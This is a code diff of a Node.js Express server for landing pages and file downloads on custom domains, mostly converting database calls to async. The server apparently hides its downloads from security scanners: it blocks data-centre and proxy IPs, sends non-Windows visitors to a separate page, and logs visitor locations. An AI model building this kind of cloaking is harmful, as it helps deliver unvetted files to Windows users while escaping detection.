@@ -6,7 +6,7 @@ const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 const https = require('https');
-const { initDb, queryAll, queryOne, runSql } = require('./db');
+const { initDb, queryAll, queryOne, runSql, rawQueryAll, rawQueryOne } = require('./db');
 
 const app = express();
 app.set('trust proxy', false);
@@ -16,7 +16,7 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true }));
 app.use(session({
-  secret: 'sc-landing-pages-secret-key-change-in-production',
+  secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
   resave: false,
   saveUninitialized: false,
   cookie: { maxAge: 24 * 60 * 60 * 1000 }
@@ -185,12 +185,12 @@ function blockedPage(reason) {
 const BLOCKED_USAGE_TYPES = new Set(['DCH', 'SES', 'RSV', 'CDN']);
 
 function ip2locationLookup(ip) {
-  return new Promise((resolve) => {
+  return new Promise(async (resolve) => {
     const cached = ipLookupCache.get(ip);
     if (cached && Date.now() - cached.timestamp < IP_CACHE_TTL) {
       return resolve(cached.data);
     }
-    const setting = queryOne("SELECT value FROM settings WHERE key = 'ip2location_api_key'");
+    const setting = await queryOne("SELECT value FROM settings WHERE key = 'ip2location_api_key'");
     if (!setting || !setting.value) return resolve(null);
 
     const url = 'https://api.ip2location.io/?key=' + encodeURIComponent(setting.value) + '&ip=' + encodeURIComponent(ip);
@@ -334,7 +334,7 @@ document.getElementById("fail-msg").style.display="block";
 }
 
 // Bot guard middleware
-function botGuard(req, res, next) {
+async function botGuard(req, res, next) {
   // Only protect public page/download routes and custom domain requests
   const isPageRoute = req.path.startsWith('/page/') || req.path.startsWith('/download/');
   const host = req.hostname;
@@ -348,11 +348,11 @@ function botGuard(req, res, next) {
   const ua = req.headers['user-agent'] || '';
 
   // 1. IP allowlist
-  const allowed = queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'allow']);
+  const allowed = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'allow']);
   if (allowed) return next();
 
   // 2. IP blocklist
-  const blocked = queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'block']);
+  const blocked = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'block']);
   if (blocked) {
     logBotBlock(ip, ua, 'IP blocklisted', 'ip_blocklist', req.path);
     return res.status(403).send(blockedPage('Your IP has been blocked.'));
@@ -427,8 +427,8 @@ function windowsOnlyPage() {
 }
 
 // Shared page renderer
-function renderPage(page, res) {
-  const activeVersion = queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [page.id]);
+async function renderPage(page, res) {
+  const activeVersion = await queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [page.id]);
   const downloadUrl = activeVersion ? '/download/' + page.id : '';
   const fileName = activeVersion ? (activeVersion.original_name || activeVersion.file_name) : '';
   const version = activeVersion ? activeVersion.version : '';
@@ -449,17 +449,17 @@ function renderPage(page, res) {
 }
 
 // Domain-based routing middleware
-app.use((req, res, next) => {
+app.use(async (req, res, next) => {
   const host = req.hostname;
   if (host === 'localhost' || host === '127.0.0.1' || req.path.startsWith('/api/') || req.path.startsWith('/uploads/') || req.path.startsWith('/assets/')) return next();
 
-  const domainRecord = queryOne('SELECT d.page_id, p.id as pid, p.html_code, p.name, p.status FROM domains d LEFT JOIN pages p ON d.page_id = p.id WHERE d.domain = ?', [host]);
+  const domainRecord = await queryOne('SELECT d.page_id, p.id as pid, p.html_code, p.name, p.status FROM domains d LEFT JOIN pages p ON d.page_id = p.id WHERE d.domain = ?', [host]);
   if (!domainRecord || !domainRecord.page_id || !domainRecord.html_code) return next();
 
   // Windows-only check
   if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());
 
-  renderPage(domainRecord, res);
+  await renderPage(domainRecord, res);
 });
 
 // ═══════════ BOT VERIFY ═══════════
@@ -541,103 +541,106 @@ app.post('/api/bot-verify', async (req, res) => {
 });
 
 // ═══════════ BOT ADMIN API ═══════════
-app.get('/api/bot-stats', requireAdmin, (req, res) => {
-  const total = queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
+app.get('/api/bot-stats', requireAdmin, async (req, res) => {
+  const total = await queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
   const todayStr = today();
-  const blockedToday = queryOne('SELECT COUNT(*) as c FROM bot_blocks WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
-  const byType = queryAll('SELECT block_type, COUNT(*) as count FROM bot_blocks GROUP BY block_type ORDER BY count DESC');
-  const topIps = queryAll('SELECT ip, COUNT(*) as count FROM bot_blocks GROUP BY ip ORDER BY count DESC LIMIT 10');
-  const blocklisted = queryOne('SELECT COUNT(*) as c FROM bot_ip_list WHERE list_type = ?', ['block']) || { c: 0 };
+  const blockedToday = await queryOne('SELECT COUNT(*) as c FROM bot_blocks WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
+  const byType = await queryAll('SELECT block_type, COUNT(*) as count FROM bot_blocks GROUP BY block_type ORDER BY count DESC');
+  const topIps = await queryAll('SELECT ip, COUNT(*) as count FROM bot_blocks GROUP BY ip ORDER BY count DESC LIMIT 10');
+  const blocklisted = await queryOne('SELECT COUNT(*) as c FROM bot_ip_list WHERE list_type = ?', ['block']) || { c: 0 };
   res.json({ total: total.c, today: blockedToday.c, byType, topIps, blocklisted: blocklisted.c });
 });
 
-app.get('/api/bot-blocks', requireAdmin, (req, res) => {
+app.get('/api/bot-blocks', requireAdmin, async (req, res) => {
   const page = parseInt(req.query.page) || 1;
   const limit = Math.min(parseInt(req.query.limit) || 50, 200);
   const offset = (page - 1) * limit;
-  const total = queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
-  const blocks = queryAll('SELECT * FROM bot_blocks ORDER BY id DESC LIMIT ? OFFSET ?', [limit, offset]);
+  const total = await queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
+  const blocks = await queryAll('SELECT * FROM bot_blocks ORDER BY id DESC LIMIT ? OFFSET ?', [limit, offset]);
   res.json({ blocks, total: total.c, page, limit });
 });
 
-app.get('/api/bot-ip-list', requireAdmin, (req, res) => {
-  const list = queryAll('SELECT * FROM bot_ip_list ORDER BY id DESC');
+app.get('/api/bot-ip-list', requireAdmin, async (req, res) => {
+  const list = await queryAll('SELECT * FROM bot_ip_list ORDER BY id DESC');
   res.json(list);
 });
 
-app.post('/api/bot-ip-list', requireAdmin, (req, res) => {
+app.post('/api/bot-ip-list', requireAdmin, async (req, res) => {
   const { ip, listType, note } = req.body;
   if (!ip || !listType) return res.status(400).json({ error: 'IP and list type required' });
   if (!['allow', 'block'].includes(listType)) return res.status(400).json({ error: 'Invalid list type' });
 
-  const existing = queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, listType]);
+  const existing = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, listType]);
   if (existing) return res.status(400).json({ error: 'IP already in ' + listType + ' list' });
 
-  runSql('INSERT INTO bot_ip_list (ip, list_type, note, created) VALUES (?, ?, ?, ?)',
+  await runSql('INSERT INTO bot_ip_list (ip, list_type, note, created) VALUES (?, ?, ?, ?)',
     [ip, listType, note || '', new Date().toISOString()]
   );
   logActivity('Bot IP ' + (listType === 'block' ? 'Blocked' : 'Allowed'), ip, req.session.user.name);
   res.json({ ok: true });
 });
 
-app.delete('/api/bot-ip-list/:id', requireAdmin, (req, res) => {
-  const entry = queryOne('SELECT * FROM bot_ip_list WHERE id = ?', [req.params.id]);
+app.delete('/api/bot-ip-list/:id', requireAdmin, async (req, res) => {
+  const entry = await queryOne('SELECT * FROM bot_ip_list WHERE id = ?', [req.params.id]);
   if (!entry) return res.status(404).json({ error: 'Entry not found' });
 
-  runSql('DELETE FROM bot_ip_list WHERE id = ?', [req.params.id]);
+  await runSql('DELETE FROM bot_ip_list WHERE id = ?', [req.params.id]);
   logActivity('Bot IP Removed', entry.ip + ' from ' + entry.list_type + ' list', req.session.user.name);
   res.json({ ok: true });
 });
 
-app.delete('/api/bot-blocks', requireAdmin, (req, res) => {
-  runSql('DELETE FROM bot_blocks', []);
+app.delete('/api/bot-blocks', requireAdmin, async (req, res) => {
+  await runSql('DELETE FROM bot_blocks', []);
   logActivity('Bot Logs Cleared', 'All block logs cleared', req.session.user.name);
   res.json({ ok: true });
 });
 
 // ═══════════ VISITOR LOGS ADMIN API ═══════════
-app.get('/api/visitor-stats', requireAdmin, (req, res) => {
-  const total = queryOne('SELECT COUNT(*) as c FROM visitor_logs') || { c: 0 };
-  const uniqueIps = queryOne('SELECT COUNT(DISTINCT ip) as c FROM visitor_logs') || { c: 0 };
-  const blocked = queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 1') || { c: 0 };
+app.get('/api/visitor-stats', requireAdmin, async (req, res) => {
+  const total = await queryOne('SELECT COUNT(*) as c FROM visitor_logs') || { c: 0 };
+  const uniqueIps = await queryOne('SELECT COUNT(DISTINCT ip) as c FROM visitor_logs') || { c: 0 };
+  const blocked = await queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 1') || { c: 0 };
   const todayStr = today();
-  const todayCount = queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
-  const topCountries = queryAll('SELECT country_code, country_name, COUNT(*) as count FROM visitor_logs WHERE country_code IS NOT NULL GROUP BY country_code ORDER BY count DESC LIMIT 10');
-  const topCities = queryAll('SELECT city_name, country_code, COUNT(*) as count FROM visitor_logs WHERE city_name IS NOT NULL GROUP BY city_name, country_code ORDER BY count DESC LIMIT 10');
-  const topIsps = queryAll('SELECT isp, COUNT(*) as count FROM visitor_logs WHERE isp IS NOT NULL GROUP BY isp ORDER BY count DESC LIMIT 10');
-  const blockReasons = queryAll('SELECT block_reason, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 1 AND block_reason IS NOT NULL GROUP BY block_reason ORDER BY count DESC LIMIT 10');
+  const todayCount = await queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
+  const topCountries = await queryAll('SELECT country_code, country_name, COUNT(*) as count FROM visitor_logs WHERE country_code IS NOT NULL GROUP BY country_code, country_name ORDER BY count DESC LIMIT 10');
+  const topCities = await queryAll('SELECT city_name, country_code, COUNT(*) as count FROM visitor_logs WHERE city_name IS NOT NULL GROUP BY city_name, country_code ORDER BY count DESC LIMIT 10');
+  const topIsps = await queryAll('SELECT isp, COUNT(*) as count FROM visitor_logs WHERE isp IS NOT NULL GROUP BY isp ORDER BY count DESC LIMIT 10');
+  const blockReasons = await queryAll('SELECT block_reason, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 1 AND block_reason IS NOT NULL GROUP BY block_reason ORDER BY count DESC LIMIT 10');
   res.json({ total: total.c, uniqueIps: uniqueIps.c, blocked: blocked.c, today: todayCount.c, topCountries, topCities, topIsps, blockReasons });
 });
 
-app.get('/api/visitor-logs', requireAdmin, (req, res) => {
+app.get('/api/visitor-logs', requireAdmin, async (req, res) => {
   const page = parseInt(req.query.page) || 1;
   const limit = Math.min(parseInt(req.query.limit) || 50, 200);
   const offset = (page - 1) * limit;
   const where = [];
   const params = [];
-  if (req.query.country) { where.push('country_code = ?'); params.push(req.query.country); }
+  let paramIdx = 0;
+  if (req.query.country) { paramIdx++; where.push('country_code = $' + paramIdx); params.push(req.query.country); }
   if (req.query.blocked === 'true') { where.push('is_blocked = 1'); }
   else if (req.query.blocked === 'false') { where.push('is_blocked = 0'); }
-  if (req.query.from) { where.push('created >= ?'); params.push(req.query.from); }
-  if (req.query.to) { where.push('created <= ?'); params.push(req.query.to + 'T23:59:59'); }
+  if (req.query.from) { paramIdx++; where.push('created >= $' + paramIdx); params.push(req.query.from); }
+  if (req.query.to) { paramIdx++; where.push('created <= $' + paramIdx); params.push(req.query.to + 'T23:59:59'); }
   const whereClause = where.length > 0 ? 'WHERE ' + where.join(' AND ') : '';
-  const total = queryOne('SELECT COUNT(*) as c FROM visitor_logs ' + whereClause, params) || { c: 0 };
-  const logs = queryAll('SELECT * FROM visitor_logs ' + whereClause + ' ORDER BY id DESC LIMIT ? OFFSET ?', [...params, limit, offset]);
-  res.json({ logs, total: total.c, page, limit });
+  const totalRow = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs ' + whereClause, params) || { c: 0 };
+  paramIdx++;
+  paramIdx++;
+  const logs = await rawQueryAll('SELECT * FROM visitor_logs ' + whereClause + ' ORDER BY id DESC LIMIT $' + (paramIdx - 1) + ' OFFSET $' + paramIdx, [...params, limit, offset]);
+  res.json({ logs, total: totalRow.c, page, limit });
 });
 
-app.delete('/api/visitor-logs', requireAdmin, (req, res) => {
-  runSql('DELETE FROM visitor_logs', []);
+app.delete('/api/visitor-logs', requireAdmin, async (req, res) => {
+  await runSql('DELETE FROM visitor_logs', []);
   logActivity('Visitor Logs Cleared', 'All visitor logs cleared', req.session.user.name);
   res.json({ ok: true });
 });
 
 // ═══════════ AUTH ═══════════
-app.post('/api/auth/login', loginGuard, (req, res) => {
+app.post('/api/auth/login', loginGuard, async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
-  const user = queryOne('SELECT * FROM users WHERE email = ?', [email]);
+  const user = await queryOne('SELECT * FROM users WHERE email = ?', [email]);
   if (!user) return res.status(401).json({ error: 'Invalid credentials' });
   if (user.status !== 'Active') return res.status(403).json({ error: 'Account is inactive' });
   if (!bcrypt.compareSync(password, user.password)) {
@@ -672,99 +675,99 @@ app.get('/api/auth/me', (req, res) => {
 });
 
 // ═══════════ USERS (Admin) ═══════════
-app.get('/api/users', requireAdmin, (req, res) => {
-  const users = queryAll('SELECT id, name, email, role, status, created FROM users ORDER BY created DESC');
+app.get('/api/users', requireAdmin, async (req, res) => {
+  const users = await queryAll('SELECT id, name, email, role, status, created FROM users ORDER BY created DESC');
   res.json(users);
 });
 
-app.post('/api/users', requireAdmin, (req, res) => {
+app.post('/api/users', requireAdmin, async (req, res) => {
   const { name, email, password, role, status } = req.body;
   if (!name || !email || !password) return res.status(400).json({ error: 'Name, email, and password required' });
 
-  const existing = queryOne('SELECT id FROM users WHERE email = ?', [email]);
+  const existing = await queryOne('SELECT id FROM users WHERE email = ?', [email]);
   if (existing) return res.status(400).json({ error: 'Email already exists' });
 
   const id = uid();
   const hash = bcrypt.hashSync(password, 10);
-  runSql('INSERT INTO users (id, name, email, password, role, status, created) VALUES (?, ?, ?, ?, ?, ?, ?)',
+  await runSql('INSERT INTO users (id, name, email, password, role, status, created) VALUES (?, ?, ?, ?, ?, ?, ?)',
     [id, name, email, hash, role || 'User', status || 'Active', today()]
   );
   logActivity('User Created', 'Created user: ' + name, req.session.user.name);
   res.json({ id, name, email, role: role || 'User', status: status || 'Active', created: today() });
 });
 
-app.put('/api/users/:id', requireAdmin, (req, res) => {
+app.put('/api/users/:id', requireAdmin, async (req, res) => {
   const { name, email, role, status, password } = req.body;
-  const user = queryOne('SELECT * FROM users WHERE id = ?', [req.params.id]);
+  const user = await queryOne('SELECT * FROM users WHERE id = ?', [req.params.id]);
   if (!user) return res.status(404).json({ error: 'User not found' });
 
   const updates = { name: name || user.name, email: email || user.email, role: role || user.role, status: status || user.status };
 
   if (email && email !== user.email) {
-    const dup = queryOne('SELECT id FROM users WHERE email = ? AND id != ?', [email, req.params.id]);
+    const dup = await queryOne('SELECT id FROM users WHERE email = ? AND id != ?', [email, req.params.id]);
     if (dup) return res.status(400).json({ error: 'Email already exists' });
   }
 
   if (password) {
     const hash = bcrypt.hashSync(password, 10);
-    runSql('UPDATE users SET name=?, email=?, password=?, role=?, status=? WHERE id=?',
+    await runSql('UPDATE users SET name=?, email=?, password=?, role=?, status=? WHERE id=?',
       [updates.name, updates.email, hash, updates.role, updates.status, req.params.id]);
   } else {
-    runSql('UPDATE users SET name=?, email=?, role=?, status=? WHERE id=?',
+    await runSql('UPDATE users SET name=?, email=?, role=?, status=? WHERE id=?',
       [updates.name, updates.email, updates.role, updates.status, req.params.id]);
   }
   logActivity('User Updated', 'Updated user: ' + updates.name, req.session.user.name);
   res.json({ ...updates, id: req.params.id });
 });
 
-app.delete('/api/users/:id', requireAdmin, (req, res) => {
-  const user = queryOne('SELECT name FROM users WHERE id = ?', [req.params.id]);
+app.delete('/api/users/:id', requireAdmin, async (req, res) => {
+  const user = await queryOne('SELECT name FROM users WHERE id = ?', [req.params.id]);
   if (!user) return res.status(404).json({ error: 'User not found' });
   if (req.params.id === req.session.user.id) return res.status(400).json({ error: 'Cannot delete yourself' });
 
-  runSql('DELETE FROM users WHERE id = ?', [req.params.id]);
+  await runSql('DELETE FROM users WHERE id = ?', [req.params.id]);
   logActivity('User Deleted', 'Deleted user: ' + user.name, req.session.user.name);
   res.json({ ok: true });
 });
 
 // ═══════════ PAGES (Admin) ═══════════
-app.get('/api/pages', requireAuth, (req, res) => {
-  const pages = queryAll('SELECT * FROM pages ORDER BY created DESC');
-  pages.forEach(p => {
-    p.versions = queryAll('SELECT * FROM versions WHERE page_id = ? ORDER BY date DESC', [p.id]);
-  });
+app.get('/api/pages', requireAuth, async (req, res) => {
+  const pages = await queryAll('SELECT * FROM pages ORDER BY created DESC');
+  for (const p of pages) {
+    p.versions = await queryAll('SELECT * FROM versions WHERE page_id = ? ORDER BY date DESC', [p.id]);
+  }
   res.json(pages);
 });
 
-app.post('/api/pages', requireAdmin, (req, res) => {
+app.post('/api/pages', requireAdmin, async (req, res) => {
   const { name, htmlCode, status } = req.body;
   if (!name) return res.status(400).json({ error: 'Page name required' });
 
   const id = uid();
-  runSql('INSERT INTO pages (id, name, html_code, status, created) VALUES (?, ?, ?, ?, ?)',
+  await runSql('INSERT INTO pages (id, name, html_code, status, created) VALUES (?, ?, ?, ?, ?)',
     [id, name, htmlCode || '', status || 'active', today()]
   );
   logActivity('Page Created', 'Created page: ' + name, req.session.user.name);
   res.json({ id, name, html_code: htmlCode || '', status: status || 'active', created: today(), versions: [] });
 });
 
-app.put('/api/pages/:id', requireAdmin, (req, res) => {
+app.put('/api/pages/:id', requireAdmin, async (req, res) => {
   const { name, htmlCode, status } = req.body;
-  const page = queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
+  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
 
-  runSql('UPDATE pages SET name=?, html_code=?, status=? WHERE id=?',
+  await runSql('UPDATE pages SET name=?, html_code=?, status=? WHERE id=?',
     [name || page.name, htmlCode !== undefined ? htmlCode : page.html_code, status || page.status, req.params.id]
   );
   logActivity('Page Updated', 'Updated page: ' + (name || page.name), req.session.user.name);
   res.json({ ok: true });
 });
 
-app.delete('/api/pages/:id', requireAdmin, (req, res) => {
-  const page = queryOne('SELECT name FROM pages WHERE id = ?', [req.params.id]);
+app.delete('/api/pages/:id', requireAdmin, async (req, res) => {
+  const page = await queryOne('SELECT name FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
 
-  const versions = queryAll('SELECT file_path FROM versions WHERE page_id = ?', [req.params.id]);
+  const versions = await queryAll('SELECT file_path FROM versions WHERE page_id = ?', [req.params.id]);
   versions.forEach(v => {
     if (v.file_path) {
       const fp = path.join(uploadsDir, v.file_path);
@@ -772,21 +775,21 @@ app.delete('/api/pages/:id', requireAdmin, (req, res) => {
     }
   });
 
-  runSql('DELETE FROM versions WHERE page_id = ?', [req.params.id]);
-  runSql('DELETE FROM pages WHERE id = ?', [req.params.id]);
+  await runSql('DELETE FROM versions WHERE page_id = ?', [req.params.id]);
+  await runSql('DELETE FROM pages WHERE id = ?', [req.params.id]);
   logActivity('Page Deleted', 'Deleted page: ' + page.name, req.session.user.name);
   res.json({ ok: true });
 });
 
 // ═══════════ VERSIONS / FILE UPLOAD (User) ═══════════
-app.post('/api/pages/:id/upload', requireAuth, upload.single('file'), (req, res) => {
+app.post('/api/pages/:id/upload', requireAuth, upload.single('file'), async (req, res) => {
   if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
 
-  const page = queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
+  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
 
   // Auto-increment version
-  const latest = queryOne('SELECT version FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [req.params.id]);
+  const latest = await queryOne('SELECT version FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [req.params.id]);
   let newVer = '0.0.1';
   if (latest && latest.version) {
     const parts = latest.version.split('.');
@@ -795,10 +798,10 @@ app.post('/api/pages/:id/upload', requireAuth, upload.single('file'), (req, res)
   }
 
   // Deactivate all existing versions
-  runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [req.params.id]);
+  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [req.params.id]);
 
   const vId = uid();
-  runSql('INSERT INTO versions (id, page_id, version, file_name, file_path, original_name, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)',
+  await runSql('INSERT INTO versions (id, page_id, version, file_name, file_path, original_name, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)',
     [vId, req.params.id, newVer, req.file.filename, req.file.filename, req.file.originalname, 'Uploaded on ' + today(), today()]
   );
 
@@ -806,20 +809,20 @@ app.post('/api/pages/:id/upload', requireAuth, upload.single('file'), (req, res)
   res.json({ id: vId, version: newVer, fileName: req.file.originalname, active: true });
 });
 
-app.put('/api/versions/:id/activate', requireAuth, (req, res) => {
-  const ver = queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
+app.put('/api/versions/:id/activate', requireAuth, async (req, res) => {
+  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
   if (!ver) return res.status(404).json({ error: 'Version not found' });
 
-  runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [ver.page_id]);
-  runSql('UPDATE versions SET active = 1 WHERE id = ?', [req.params.id]);
+  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [ver.page_id]);
+  await runSql('UPDATE versions SET active = 1 WHERE id = ?', [req.params.id]);
   res.json({ ok: true });
 });
 
-app.delete('/api/versions/:id', requireAuth, (req, res) => {
-  const ver = queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
+app.delete('/api/versions/:id', requireAuth, async (req, res) => {
+  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
   if (!ver) return res.status(404).json({ error: 'Version not found' });
 
-  const rows = queryAll('SELECT id FROM versions WHERE page_id = ?', [ver.page_id]);
+  const rows = await queryAll('SELECT id FROM versions WHERE page_id = ?', [ver.page_id]);
   if (rows.length <= 1) return res.status(400).json({ error: 'Cannot delete the only version' });
 
   if (ver.file_path) {
@@ -828,40 +831,40 @@ app.delete('/api/versions/:id', requireAuth, (req, res) => {
   }
 
   const wasActive = ver.active;
-  runSql('DELETE FROM versions WHERE id = ?', [req.params.id]);
+  await runSql('DELETE FROM versions WHERE id = ?', [req.params.id]);
 
   if (wasActive) {
-    const next = queryOne('SELECT id FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [ver.page_id]);
-    if (next) runSql('UPDATE versions SET active = 1 WHERE id = ?', [next.id]);
+    const next = await queryOne('SELECT id FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [ver.page_id]);
+    if (next) await runSql('UPDATE versions SET active = 1 WHERE id = ?', [next.id]);
   }
 
   res.json({ ok: true });
 });
 
 // ═══════════ DOMAINS (User) ═══════════
-app.get('/api/domains', requireAuth, (req, res) => {
-  const domains = queryAll('SELECT * FROM domains WHERE user_id = ? ORDER BY created DESC', [req.session.user.id]);
+app.get('/api/domains', requireAuth, async (req, res) => {
+  const domains = await queryAll('SELECT * FROM domains WHERE user_id = ? ORDER BY created DESC', [req.session.user.id]);
   res.json(domains);
 });
 
-app.post('/api/domains', requireAuth, (req, res) => {
+app.post('/api/domains', requireAuth, async (req, res) => {
   const { domain, pageId, dnsType, dnsValue, autoSSL, notes } = req.body;
   if (!domain) return res.status(400).json({ error: 'Domain name required' });
 
   const id = uid();
-  runSql('INSERT INTO domains (id, user_id, domain, page_id, dns_type, dns_value, auto_ssl, ssl_active, notes, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?, ?)',
+  await runSql('INSERT INTO domains (id, user_id, domain, page_id, dns_type, dns_value, auto_ssl, ssl_active, notes, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?, ?)',
     [id, req.session.user.id, domain, pageId || null, dnsType || 'A', dnsValue || '', autoSSL ? 1 : 0, notes || '', today()]
   );
   logActivity('Domain Added', 'Added domain: ' + domain, req.session.user.name);
   res.json({ id, domain, page_id: pageId, dns_type: dnsType || 'A', dns_value: dnsValue || '', auto_ssl: autoSSL ? 1 : 0, ssl_active: 0, notes: notes || '', created: today() });
 });
 
-app.put('/api/domains/:id', requireAuth, (req, res) => {
-  const dom = queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
+app.put('/api/domains/:id', requireAuth, async (req, res) => {
+  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
   if (!dom) return res.status(404).json({ error: 'Domain not found' });
 
   const { domain, pageId, dnsType, dnsValue, autoSSL, notes } = req.body;
-  runSql('UPDATE domains SET domain=?, page_id=?, dns_type=?, dns_value=?, auto_ssl=?, notes=? WHERE id=?',
+  await runSql('UPDATE domains SET domain=?, page_id=?, dns_type=?, dns_value=?, auto_ssl=?, notes=? WHERE id=?',
     [domain || dom.domain, pageId !== undefined ? pageId : dom.page_id, dnsType || dom.dns_type,
      dnsValue !== undefined ? dnsValue : dom.dns_value, autoSSL !== undefined ? (autoSSL ? 1 : 0) : dom.auto_ssl,
      notes !== undefined ? notes : dom.notes, req.params.id]
@@ -869,30 +872,30 @@ app.put('/api/domains/:id', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.delete('/api/domains/:id', requireAuth, (req, res) => {
-  const dom = queryOne('SELECT domain FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
+app.delete('/api/domains/:id', requireAuth, async (req, res) => {
+  const dom = await queryOne('SELECT domain FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
   if (!dom) return res.status(404).json({ error: 'Domain not found' });
 
-  runSql('DELETE FROM domains WHERE id = ?', [req.params.id]);
+  await runSql('DELETE FROM domains WHERE id = ?', [req.params.id]);
   logActivity('Domain Deleted', 'Deleted domain: ' + dom.domain, req.session.user.name);
   res.json({ ok: true });
 });
 
-app.post('/api/domains/:id/ssl', requireAuth, (req, res) => {
-  const dom = queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
+app.post('/api/domains/:id/ssl', requireAuth, async (req, res) => {
+  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
   if (!dom) return res.status(404).json({ error: 'Domain not found' });
 
   const { action } = req.body;
   if (action === 'generate' || action === 'renew') {
-    runSql('UPDATE domains SET ssl_active = 1, ssl_date = ? WHERE id = ?', [today(), req.params.id]);
+    await runSql('UPDATE domains SET ssl_active = 1, ssl_date = ? WHERE id = ?', [today(), req.params.id]);
     logActivity('SSL ' + (action === 'generate' ? 'Generated' : 'Renewed'), dom.domain, req.session.user.name);
   }
   res.json({ ok: true });
 });
 
 // ═══════════ LINKS (User) ═══════════
-app.get('/api/links', requireAuth, (req, res) => {
-  const links = queryAll(
+app.get('/api/links', requireAuth, async (req, res) => {
+  const links = await queryAll(
     'SELECT d.*, p.name as page_name FROM domains d LEFT JOIN pages p ON d.page_id = p.id WHERE d.user_id = ? ORDER BY d.created DESC',
     [req.session.user.id]
   );
@@ -920,51 +923,51 @@ app.get('/api/links', requireAuth, (req, res) => {
 });
 
 // ═══════════ ACTIVITY & SETTINGS (Admin) ═══════════
-app.get('/api/activity', requireAdmin, (req, res) => {
-  const items = queryAll('SELECT * FROM activity ORDER BY id DESC LIMIT 50');
+app.get('/api/activity', requireAdmin, async (req, res) => {
+  const items = await queryAll('SELECT * FROM activity ORDER BY id DESC LIMIT 50');
   res.json(items);
 });
 
-app.get('/api/settings', requireAdmin, (req, res) => {
-  const rows = queryAll('SELECT * FROM settings');
+app.get('/api/settings', requireAdmin, async (req, res) => {
+  const rows = await queryAll('SELECT * FROM settings');
   const obj = {};
   rows.forEach(r => { obj[r.key] = r.value; });
   res.json(obj);
 });
 
-app.put('/api/settings', requireAdmin, (req, res) => {
-  Object.entries(req.body).forEach(([k, v]) => {
-    const existing = queryOne('SELECT key FROM settings WHERE key = ?', [k]);
+app.put('/api/settings', requireAdmin, async (req, res) => {
+  for (const [k, v] of Object.entries(req.body)) {
+    const existing = await queryOne('SELECT key FROM settings WHERE key = ?', [k]);
     if (existing) {
-      runSql('UPDATE settings SET value = ? WHERE key = ?', [v, k]);
+      await runSql('UPDATE settings SET value = ? WHERE key = ?', [v, k]);
     } else {
-      runSql('INSERT INTO settings (key, value) VALUES (?, ?)', [k, v]);
+      await runSql('INSERT INTO settings (key, value) VALUES (?, ?)', [k, v]);
     }
-  });
+  }
   res.json({ ok: true });
 });
 
 // ═══════════ STATS ═══════════
-app.get('/api/stats', requireAuth, (req, res) => {
+app.get('/api/stats', requireAuth, async (req, res) => {
   const user = req.session.user;
